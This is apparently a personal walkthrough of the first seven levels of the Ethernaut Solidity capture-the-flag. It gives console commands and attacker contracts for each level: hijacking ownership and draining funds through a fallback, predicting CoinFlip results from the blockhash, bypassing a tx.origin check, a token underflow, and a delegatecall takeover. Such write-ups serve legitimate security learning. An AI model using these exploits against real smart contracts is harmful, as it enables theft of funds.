# This is a walkthrough of the Ethernaut Solidity CTF.

I did it previously but I want to go through it again and write a detailled walkthrough.

# Levels
## Lvl-0 Hello Ethernaut
Follow the instructions in the console until you get to:
`await contract.method7123949()
'If you know the password, submit it to authenticate().'`.
Remember that you can access to the ABI object with 'contract.abi'.
You will see the 'password' method that you can call:
`'await contract.password()
'ethernaut0'`
Then simply call contract.authenticate() with the param 'ethernaut0', pay for the transaction with metamask,
wait for tx to be mined, click the 'submit instance' button and voila!

## Lvl-1 Fallback
To pass this level, you first need to send some eth to it through the contribute() function, then some more eth through the fallback function.
First check that your contribution is 0, with 'await contract.checkContributions()' that returns 0.
Then call 'await contract.contribute({value: 1})' and pay for the tx.
Wait for the tx to be mined then call 'await contract.checkContributions()' again. It should now be 1.
Now you can send eth through the fallback function with
'await web3.eth.sendTransaction({to: instance, from: player, value: 1})'.
Waited for the tx to be mined and check the owner with 'await contract.owner()'
It should be your address.
You can now call the withdraw function and drain the contract of it's balance.
Call 'await web3.eth.getBalance(instance)' to check that balance is 0.
Click 'submit instance'.

## Lvl-2 Fallout
For this level, you just have to call the 'Fallout()' function with 1 wei and the contract will be yours.
The code comments say that Fallout() is the constructor but that's wrong. Since Solidity v0.4.23, constructors are now specified using the constructor keyword, and since the code is Solidity 0.6, the function Fallout() is not called during deployement and no owner is assigned to the contract.

## Lvl-3 CoinFlip
In order to beat this level, you need to write a smart contract in remix that does the same calcul then the targeted contract and send the guess to the target.
Here is the code:

```
pragma solidity 0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/docs-v3.x/contracts/math/SafeMath.sol';

interface CoinFlip {
    function flip(bool) external;
}

contract Flipper {

    using SafeMath for uint256;

    CoinFlip target = CoinFlip(0xe364E0Cd32846CfbeBfBe21E84611e8467F0E1A4);

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() public returns(bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }
}
```
Then just call the 'attack()' function 10 times (wait some time between each calls to be sure you are not calling the function twice within one block).

## Lvl-4 Telephone
Simply make a contract that calls 'changeOwner()' while passing the msg.sender of your address as the arguments.
```
pragma solidity 0.6.0;
contract Caller {
    Telephone telephone = Telephone(YOUR_INSTANCE_ADD);

    function call() public {
        telephone.changeOwner(msg.sender);
    }
}
```
The tx.origin will be your metamask address, the msg.sender will be your Caller contract, and therefore you will pass the check on the first line of 'changeOwner()'.

## Lvl-5 Token
The first thing you need to notice, in that level, is the abscence of safeMath library. We are dealing with a token from a contract that is not protected by safeMath for overflow and underflow.
The attack is therefore simple.
You just need to use the transfer function to send more than what you have, which will underflow your balance and you will end up with a ridiculous amount of tokens.
Simply use the console to call the transfer() function:
``
await contract.transfer('0xF553874CD699b2285DCcCe8d014e9B0f66eFC63d', 21000000);
``
and click submit.

## Lvl-6 DelegateCall
A quick look at the code shows us that the main contract has a fallback function that delegateCalls another contract.
If we can send a transaction to the main contract with instructions to call the pwn() function, our call will go through to the 'Delegate' contract and execute the pwn() function.
To do this, we need to prepare the payload with by typing in the console: `const payload = web3.eth.abi.encodeFunctionSignature("pwn()")` which is '0xdd365b8b', the 4 first bytes signature of the function 'pwn()', send call the fallback() function with the payload as data of the call: `await contract.sendTransaction({data: payload})`.
Wait for tx to be mined and, voila, you are now the owner of the delegation contract!

